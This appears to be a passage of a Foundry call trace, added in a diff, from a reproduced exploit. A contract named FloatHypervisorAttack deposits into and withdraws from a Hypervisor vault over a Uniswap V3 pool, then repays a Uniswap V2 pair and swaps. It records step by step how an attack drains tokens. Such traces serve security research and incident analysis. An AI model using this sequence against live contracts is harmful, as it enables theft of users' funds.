+    │   │   │   │   │   │   │   ├─ [26010] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, 394911862263990464219244 [3.949e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, amount: 394911862263990464219244 [3.949e23])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, amount: 115792089237316195423570985008687907853269984665640563640545721743922665420691 [1.157e77])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x7493fa38636fdf53bc6a25e0ed6dd59a309439f6929b684d878489663566a1f9: 0xffffffffffffffffffffffffffffffffffffffffffffff2728d948e8857fffff → 0xffffffffffffffffffffffffffffffffffffffffffffab86f1d24c875028f793
+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x0000000000000000000000000000000000000000000053a03706fc613557086c → 0
+    │   │   │   │   │   │   │   │   │   @ 0xf77bed83fe805e48a8bd8787e0875874b8398ae52a279ed93296a06ecdb040a8: 0 → 0x0000000000000000000000000000000000000000000053a03706fc613557086c
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [80901] HypervisorB::deposit(394911862263990464219244 [3.949e23], 0, FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xeff0db1974f385f4c8ecaa9e59b9a8dc43ca19dc5a9de969438ae736a8326c49) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000008b7621078a2d58b000000000000000000000000000000017ebc0af50f057d2c116191836b92c71700000000000000000000000000000000002e48a2e576c4a19ebf8686c295de54000000000000000000000000000000000000000000000016097f65a5aaa9d807000000000000000000000000000000000000000000000000025bcbefed74e507
+    │   │   │   │   │   │   │   ├─ [8493] UniV3Pool::burn(-887220 [-8.872e5], 887220 [8.872e5], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], tickLower: -887220 [-8.872e5], tickUpper: 887220 [8.872e5], amount: 0, amount0: 0, amount1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24818: 0x0000000000000000025bcbefed74e5070000000000000016097f65a5aaa9d807 → 0x0000000000000000025c724deb91f45f0000000000000016097f65a5aaa9d807
+    │   │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24817: 0x00000000000000000000000000000000002e48a2e576c4a19ebf8686c295de54 → 0x0000000000000000000000000000000000415edc5024c407be4def4d1a0e8c08
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xed2333d38121452740eb1ba5b5fdfa061273e293036ec233e5071f8714bb64c9) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000007efa1df5d1fb3d000000000000000000000000000000010d14291d583dd108424f02ad02a8beee00000000000000000000000000000000001e953e57a9395fde6974f4b4ca7dff0000000000000000000000000000000000000000000000007bf7d74d7986f4ce000000000000000000000000000000000000000000000000000722ee628bb66e
+    │   │   │   │   │   │   │   ├─ [8501] UniV3Pool::burn(-887220 [-8.872e5], -77220 [-7.722e4], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], tickLower: -887220 [-8.872e5], tickUpper: -77220 [-7.722e4], amount: 0, amount0: 0, amount1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc09: 0x0000000000000000000722ee628bb66e00000000000000007bf7d74d7986f4ce → 0x00000000000000000007241df76c962800000000000000007bf7d74d7986f4ce
+    │   │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc08: 0x00000000000000000000000000000000001e953e57a9395fde6974f4b4ca7dff → 0x000000000000000000000000000000000020f94c56cc4f5b65c9981add472b6a
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xeff0db1974f385f4c8ecaa9e59b9a8dc43ca19dc5a9de969438ae736a8326c49) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000008b7621078a2d58b000000000000000000000000000000017ebc0af50f057d2c116191836b92c7170000000000000000000000000000000000415edc5024c407be4def4d1a0e8c08000000000000000000000000000000000000000000000016097f65a5aaa9d807000000000000000000000000000000000000000000000000025c724deb91f45f
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xed2333d38121452740eb1ba5b5fdfa061273e293036ec233e5071f8714bb64c9) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000007efa1df5d1fb3d000000000000000000000000000000010d14291d583dd108424f02ad02a8beee000000000000000000000000000000000020f94c56cc4f5b65c9981add472b6a0000000000000000000000000000000000000000000000007bf7d74d7986f4ce0000000000000000000000000000000000000000000000000007241df76c9628
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 251221521315133399004 [2.512e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 251221521315133399004 [2.512e20]
+    │   │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 2769880751388380194 [2.769e18]
+    │   │   │   │   │   │   │   ├─ [6862] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transferFrom(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], 394911862263990464219244 [3.949e23])
+    │   │   │   │   │   │   │   │   ├─ [6110] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transferFrom(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], 394911862263990464219244 [3.949e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, to: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], amount: 394911862263990464219244 [3.949e23])
+    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, spender: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], amount: 115792089237316195423570985008687907853269984665640563424415237872954923570691 [1.157e77])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x8d9869854d4c63a8a8e118cf209b2e7be87d7bc818e1d2205783f4ea778e4e8d: 0xffffffffffffffffffffffffffffffffffffffffffffd162b3dad4a4d0575e6f → 0xffffffffffffffffffffffffffffffffffffffffffff7dc27cd3d8439b005603
+    │   │   │   │   │   │   │   │   │   │   @ 0x9617c035d2c1fd8a16f6c18f78c25f392a246ef1713d0b0f48b7e431245e8b3d: 0x00000000000000000000000000000000000000000000000d9e66229b81c01fdc → 0x0000000000000000000000000000000000000000000053add56d1efcb7172848
+    │   │   │   │   │   │   │   │   │   │   @ 0xf77bed83fe805e48a8bd8787e0875874b8398ae52a279ed93296a06ecdb040a8: 0x0000000000000000000000000000000000000000000053a03706fc613557086c → 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 11687202600147522006526 [1.168e22])
+    │   │   │   │   │   │   │   ├─ emit Deposit(param0: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, param1: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param2: 11687202600147522006526 [1.168e22], param3: 394911862263990464219244 [3.949e23], param4: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000000001665bba4e3107ca45 → 0x00000000000000000000000000000000000000000000027af6e045afb7c17843
+    │   │   │   │   │   │   │   │   @ 0xf681125939867b53b18ed9e847456377cee007cff53bf8cca400f655f93a8ef1: 0 → 0x00000000000000000000000000000000000000000000027990848b6186b9adfe
+    │   │   │   │   │   │   │   └─ ← [Return] 11687202600147522006526 [1.168e22]
+    │   │   │   │   │   │   └─ ← [Return] 11687202600147522006526 [1.168e22]
+    │   │   │   │   │   ├─ [105978] HypervisorB::withdraw(11687202600147522006526 [1.168e22], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xeff0db1974f385f4c8ecaa9e59b9a8dc43ca19dc5a9de969438ae736a8326c49) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000008b7621078a2d58b000000000000000000000000000000017ebc0af50f057d2c116191836b92c7170000000000000000000000000000000000415edc5024c407be4def4d1a0e8c08000000000000000000000000000000000000000000000016097f65a5aaa9d807000000000000000000000000000000000000000000000000025c724deb91f45f
+    │   │   │   │   │   │   ├─ [17803] UniV3Pool::burn(-887220 [-8.872e5], 887220 [8.872e5], 626693839287864020 [6.266e17])
+    │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], tickLower: -887220 [-8.872e5], tickUpper: 887220 [8.872e5], amount: 626693839287864020 [6.266e17], amount0: 5109634848002430051 [5.109e18], amount1: 76863646793645860 [7.686e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24815: 0x00000000000000000000000000000000000000000000000008b7621078a2d58b → 0x0000000000000000000000000000000000000000000000000004eb567ef50ab7
+    │   │   │   │   │   │   │   │   @ 4: 0x00000000000000000000000000000000000000000000003d79e43712700f8add → 0x00000000000000000000000000000000000000000000003d7131c0587661c009
+    │   │   │   │   │   │   │   │   @ 0xdc3f4388499eef42a791da8d78f6e4b5cc6376b0349c5622dcbfad8d3aa7f5bd: 0xffffffffffffffc2861bc8ed8ff07523000000000000003d79e43712700f8add → 0xffffffffffffffc28ece3fa7899e3ff7000000000000003d7131c0587661c009
+    │   │   │   │   │   │   │   │   @ 0x7f16e4ac80e3195175c78aa64fe305d939ea0f7e52dc9181b922712fa7117c19: 0x000000000000003d7a63313065e1861a000000000000003d7a63313065e1861a → 0x000000000000003d71b0ba766c33bb46000000000000003d71b0ba766c33bb46
+    │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24818: 0x0000000000000000025c724deb91f45f0000000000000016097f65a5aaa9d807 → 0x0000000000000000036d856246d8b38300000000000000165068777829ce2c6a
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000046e911d27f245463000000000000000000000000000000000000000000000000011113145b46bf24
+    │   │   │   │   │   │   ├─ [34736] UniV3Pool::collect(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], -887220 [-8.872e5], 887220 [8.872e5], 5109634848002430051 [5.109e18], 76863646793645860 [7.686e16])
+    │   │   │   │   │   │   │   ├─ [24149] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 5109634848002430051 [5.109e18])
+    │   │   │   │   │   │   │   │   ├─ [23403] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 5109634848002430051 [5.109e18]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 5109634848002430051 [5.109e18])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xb65a6fcba7239a6c772fa71308ae3f27965827fb0aa7332845b0a66e1591e5d0: 0x000000000000000000000000000000000000000000000361546a8ce37034df9c → 0x0000000000000000000000000000000000000000000003610d817b10f1108b39
+    │   │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0 → 0x00000000000000000000000000000000000000000000000046e911d27f245463
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 76863646793645860 [7.686e16])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 76863646793645860 [7.686e16])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x00000000000000000000000000000000000000000000002948608e1312322e9e → 0x0000000000000000000000000000000000000000000000294971a1276d78edc2
+    │   │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x00000000000000000000000000000000000000000000000e1ee53895ca3f838d → 0x00000000000000000000000000000000000000000000000e1dd425816ef8c469
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Collect(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], tickLower: -887220 [-8.872e5], tickUpper: 887220 [8.872e5], amount0: 5109634848002430051 [5.109e18], amount1: 76863646793645860 [7.686e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24818: 0x0000000000000000036d856246d8b38300000000000000165068777829ce2c6a → 0x0000000000000000025c724deb91f45f0000000000000016097f65a5aaa9d807
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000046e911d27f245463000000000000000000000000000000000000000000000000011113145b46bf24
+    │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xed2333d38121452740eb1ba5b5fdfa061273e293036ec233e5071f8714bb64c9) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000007efa1df5d1fb3d000000000000000000000000000000010d14291d583dd108424f02ad02a8beee000000000000000000000000000000000020f94c56cc4f5b65c9981add472b6a0000000000000000000000000000000000000000000000007bf7d74d7986f4ce0000000000000000000000000000000000000000000000000007241df76c9628
+    │   │   │   │   │   │   ├─ [15329] UniV3Pool::burn(-887220 [-8.872e5], -77220 [-7.722e4], 35662059661551485 [3.566e16])
+    │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], tickLower: -887220 [-8.872e5], tickUpper: -77220 [-7.722e4], amount: 35662059661551485 [3.566e16], amount0: 0, amount1: 750722206497827 [7.507e14])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc06: 0x000000000000000000000000000000000000000000000000007efa1df5d1fb3d → 0x000000000000000000000000000000000000000000000000000047a9a7bc13c0
+    │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc09: 0x00000000000000000007241df76c962800000000000000007bf7d74d7986f4ce → 0x00000000000000000009cee519de124b00000000000000007bf7d74d7986f4ce
+    │   │   │   │   │   │   │   │   @ 0xfee3245e2c1c9b7760f82f3ca09b133e8493299737d551b7edab3caca06d23b0: 0xffffffffffffffffff8105e20a2e04c30000000000000000007efa1df5d1fb3d → 0xffffffffffffffffffffb8565843ec400000000000000000000047a9a7bc13c0
+    │   │   │   │   │   │   │   │   @ 0x7f16e4ac80e3195175c78aa64fe305d939ea0f7e52dc9181b922712fa7117c19: 0x000000000000003d71b0ba766c33bb46000000000000003d71b0ba766c33bb46 → 0x000000000000003d713208021e1dd3c9000000000000003d713208021e1dd3c9
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002aac722717c23
+    │   │   │   │   │   │   ├─ [9301] UniV3Pool::collect(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], -887220 [-8.872e5], -77220 [-7.722e4], 0, 750722206497827 [7.507e14])
+    │   │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 750722206497827 [7.507e14])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 750722206497827 [7.507e14])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x0000000000000000000000000000000000000000000000294971a1276d78edc2 → 0x00000000000000000000000000000000000000000000002949744bee8fea69e5
+    │   │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x00000000000000000000000000000000000000000000000e1dd425816ef8c469 → 0x00000000000000000000000000000000000000000000000e1dd17aba4c874846
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Collect(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], tickLower: -887220 [-8.872e5], tickUpper: -77220 [-7.722e4], amount0: 0, amount1: 750722206497827 [7.507e14])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc09: 0x00000000000000000009cee519de124b00000000000000007bf7d74d7986f4ce → 0x00000000000000000007241df76c962800000000000000007bf7d74d7986f4ce
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002aac722717c23
+    │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 395163083785305597618248 [3.951e23]
+    │   │   │   │   │   │   │   └─ ← [Return] 395163083785305597618248 [3.951e23]
+    │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2769880751388380194 [2.769e18]
+    │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 394291910532230161336967 [3.942e23])
+    │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 394291910532230161336967 [3.942e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 394291910532230161336967 [3.942e23])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x9617c035d2c1fd8a16f6c18f78c25f392a246ef1713d0b0f48b7e431245e8b3d: 0x0000000000000000000000000000000000000000000053add56d1efcb7172848 → 0x00000000000000000000000000000000000000000000002f39f521ff96db9dc1
+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x00000000000000000000000000000000000000000000000046e911d27f245463 → 0x00000000000000000000000000000000000000000000537ee2610ecf9f5fdeea
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 2763774295284982967 [2.763e18])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 2763774295284982967 [2.763e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x2b8a864f9f2112a9074fd12f453b8d016c0fcff25857ae548779e19ac6df1bd1: 0x000000000000000000000000000000000000000000000000267097de30b24c22 → 0x0000000000000000000000000000000000000000000000000015b1ca1ae1276b
+    │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x00000000000000000000000000000000000000000000002949744bee8fea69e5 → 0x0000000000000000000000000000000000000000000000296fcf3202a5bb8e9c
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x0000000000000000000000000000000000000000, amount: 11687202600147522006526 [1.168e22])
+    │   │   │   │   │   │   ├─ emit Withdraw(param0: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param1: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param2: 11687202600147522006526 [1.168e22], param3: 394297020167078163767018 [3.942e23], param4: 2841388664285126654 [2.841e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000027af6e045afb7c17843 → 0x000000000000000000000000000000000000000000000001665bba4e3107ca45
+    │   │   │   │   │   │   │   @ 0xf681125939867b53b18ed9e847456377cee007cff53bf8cca400f655f93a8ef1: 0x00000000000000000000000000000000000000000000027990848b6186b9adfe → 0
+    │   │   │   │   │   │   └─ ← [Return] 394297020167078163767018 [3.942e23], 2841388664285126654 [2.841e18]
+    │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9], 120361083249749247743230 [1.203e23])
+    │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9], 120361083249749247743230 [1.203e23]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9], amount: 120361083249749247743230 [1.203e23])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x00000000000000000000000000000000000000000000537ee2610ecf9f5fdeea → 0x000000000000000000000000000000000000000000003a0218ce338384ce89ec
+    │   │   │   │   │   │   │   │   @ 0xc4b948fd41cc175e8979527a52bcb5d267fafc45ba8ecd9a74764598f775554d: 0x00000000000000000000000000000000000000000000032fce3fd955160e44cb → 0x000000000000000000000000000000000000000000001cac97d2b4a1309f99c9
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [100502] UniV3Pool::swap(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], true, 273935936917328916023788 [2.739e23], 1291467994120676505669234512 [1.291e27], 0x)
+    │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 238071077231653286968 [2.38e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 238071077231653286968 [2.38e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x00000000000000000000000000000000000000000000000e1dd17aba4c874846 → 0x00000000000000000000000000000000000000000000000135eb1b57153f540e
+    │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x0000000000000000000000000000000000000000000000296fcf3202a5bb8e9c → 0x00000000000000000000000000000000000000000000003657b59165dd0382d4
+    │   │   │   │   │   │   │   └─ ← [Return] true
